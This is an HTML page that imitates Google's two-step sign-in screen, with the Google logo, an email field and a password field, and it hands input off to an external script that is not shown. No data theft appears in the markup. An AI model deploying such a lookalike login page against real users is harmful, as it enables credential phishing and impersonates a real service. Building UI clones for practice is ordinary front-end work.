<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="preconnect" href="https://fonts.gstatic.com" />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap"
      rel="stylesheet"
    />

    <link rel="stylesheet" href="./reset.css" />
    <link rel="stylesheet" href="./styles.css" />

    <title>Sign in to Google Accounts</title>
  </head>

  <body>
    <div class="container">
      <!-- First step: Email input -->
      <div class="card" id="email-step">
        <img src="./images/google-logo.svg" alt="Google Logo" />
        <h2>Sign in</h2>
        <h3>Use your Google Account</h3>

        <input type="email" id="email-input" placeholder="Email or phone" />
        <div class="btn-email">
          <button type="button">Forgot email?</button>
        </div>
        <p>
          Not on your computer? Use Guest mode to sign in privately.
          <a href="">Learn more</a>
        </p>

        <div class="card-bottom">
          <a href="">Create account</a>
          <button type="button" id="next-btn">Next</button>
        </div>
      </div>

      <!-- Second step: Password input (hidden by default) -->
      <div class="card hidden" id="password-step">
        <img src="./images/google-logo.svg" alt="Google Logo" />
        <h2>Enter your password</h2>
        <h3 id="email-display"></h3>

        <input type="password" id="password-input" placeholder="Enter your password" />
        <div class="btn-email">
          <button type="button">Forgot password?</button>
        </div>

        <div class="card-bottom">
          <a href="">Back</a>
          <button type="button" id="login-btn">Log In</button>
        </div>
      </div>
    </div>

    <script src="script.js"></script>
  </body>
</html>
